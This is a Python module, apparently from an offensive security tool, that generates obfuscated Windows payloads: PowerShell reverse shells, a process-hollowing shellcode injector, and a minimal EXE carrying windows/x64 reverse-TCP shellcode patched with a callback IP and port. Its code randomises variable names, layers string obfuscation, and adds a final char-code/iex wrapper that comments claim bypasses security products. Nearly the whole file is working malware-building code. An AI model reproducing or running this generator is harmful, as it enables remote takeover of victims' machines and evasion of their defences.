from core.Obfuscator                    import Obfuscator

import random
import string
import re

class Generator:
    def __init__(self, settings):
        self.settings                   = settings

    # These functions will obfuscate our given template files.

    # With obfuscating, there still needs to be some touch of human.
    # Our templates have various parts for us to find and obfuscate.

    # This function will obfuscate our powershell "in-shell" reverse shell.
    def powershell(self):
        reverse_shell                   = open("payload/powershell/reverse_shell.ps1").read()
        variables_to_replace            = open("payload/powershell/variables").read().split("\n")

        ip_address                      = self.settings.callback_address[0]
        port_address                    = self.settings.callback_address[1]

        reverse_shell                   = reverse_shell.replace("IPADDRESS", ip_address)
        reverse_shell                   = reverse_shell.replace("PORTADDRESS", str(port_address))

        for variable in variables_to_replace:
            random_string               = "".join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
            reverse_shell               = reverse_shell.replace(variable, random_string)

        # From our added \\ to find the parts we need to obfuscate.
        pattern                         = r"\\.+?\\"

        matches                         = int(reverse_shell.count("\\")/2)

        obuscator                       = Obfuscator()
        obfuscation_fucntions           = [
            obuscator.numbers_to_characters_to_string,
            obuscator.numbers_to_character_concatenate,
            obuscator.numbers_to_character_concatenate_math,
            obuscator.random_string_to_string,
            obuscator.environment_variables_2_string,
        ]

        for match in range(matches):
            random_function             = random.choice(obfuscation_fucntions)
            reverse_shell               = re.sub(pattern, lambda m: random_function(m), reverse_shell, count=1)

        reverse_shell                   = ";".join(reverse_shell.split("\n"))
        reverse_shell                   = self.whole_payload_obfuscate(reverse_shell)

        # print(reverse_shell)

        return reverse_shell

    # This function will obfuscate our powershell "process-hollowing" reverse shell.
    def shellcode_inject(self):
        process_hollower                = open("payload/shellcode/process_hollow.ps1").read()
        variables_to_replace            = open("payload/shellcode/variables").read().split("\n")

        raw_shellcode                   = self.shellcode()
        formatted_shellcode             = self.format_shellcode(raw_shellcode)

        process_hollower                = process_hollower.replace("FORMATTEDSHELLCODE", formatted_shellcode)

        for variable in variables_to_replace:
            random_string               = "".join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
            process_hollower            = process_hollower.replace(variable, random_string)

        # From our added \\ to find the parts we need to obfuscate.
        pattern                         = r"\\.+?\\"

        matches                         = int(process_hollower.count("\\")/2)

        obuscator                       = Obfuscator()
        obfuscation_fucntions           = [
            obuscator.numbers_to_characters_to_string,
            obuscator.numbers_to_character_concatenate,
            obuscator.numbers_to_character_concatenate_math,
            obuscator.random_string_to_string,
            obuscator.environment_variables_2_string,
        ]

        for match in range(matches):
            random_function             = random.choice(obfuscation_fucntions)
            process_hollower            = re.sub(pattern, lambda m: random_function(m), process_hollower, count=1)

        process_hollower                = ";".join(process_hollower.split("\n"))
        process_hollower                = self.whole_payload_obfuscate(process_hollower)

        # open(self.settings.payload_name, "w").write(process_hollower)

        return process_hollower

    # We can move from malicious scripts, to executable code.

    # With these functions, we are able to create minimal reverse shell shellcode
    # and executable files. The EXE is perfect for a low space environment.

    # This function will create an EXE with a specified shellcode file.
    def tiny_exe(self):
        exe_headers                     = open("payload/exe_headers/exe_headers", "rb").read()
        shellcode                       = self.shellcode()

        exe                             = exe_headers + shellcode

        return exe

    # This function will generate a windows/x64/shell_reverse_tcp shellcode 
    # payload, unless otherwise specified.
    def shellcode(self):
        shellcode                       = bytearray(open("payload/raw shellcode/windows.x64.shell_reverse_tcp", "rb").read())

        ip_address                      = self.settings.callback_address[0]
        port                            = self.settings.callback_address[1]

        ip_adress_bytes                 = bytes([int(i) for i in ip_address.split(".")])
        port_bytes                      = int(port).to_bytes(2, byteorder="big")

        shellcode[232:238]              = port_bytes + ip_adress_bytes

        shellcode                       = bytes(shellcode)

        return shellcode

    # This function will format our shellcode so we can obfuscate it in
    # one of our malicious scripts.
    def format_shellcode(self, shellcode):
        hex_dump                        = shellcode.hex()
        hex_split                       = [hex_dump[index:index+2] for index in range(0, len(hex_dump), 2)]
        hex_sections                    = [hex_split[index:index+16] for index in range(0, len(hex_split), 16)]
        hex_string                      = ["(\\" + ' '.join(hex_sections[0]) + "\\)"] + ["(\\ " + ' '.join(section) + "\\)" for section in hex_sections[1:]]
        obfuscate_ready                 = "((" + '+'.join(hex_string) + ")" + "-split ' '|%{[Convert]::ToByte($_, 16)})"

        return obfuscate_ready

    # This adds a last layer of obfuscation that will bypass all
    # security solutions on the market.
    def whole_payload_obfuscate(self, script):
        script_values                   = [str(ord(character)) for character in script]
        script_values                   = ",".join(script_values)
        new_script                      = "([string]::join('',((" + script_values + ")|%{[char]$_})))|iex;;;;"

        return new_script

    # This will allow us to quickly generate our payloads and return
    # them as such.
    def generate_payload(self):
        payload                         = self.settings.payload

        payload_map                     = {
            "script"                    : self.powershell,
            "shell"                     : self.shellcode_inject,
            "exe"                       : self.tiny_exe
        }

        full_payload                    = payload_map[payload]()

        return full_payload

def test_generator():
    generator                           = Generator()
    generator.powershell()
    generator.shellcode_inject()

if __name__ == "__main__":
    test_generator()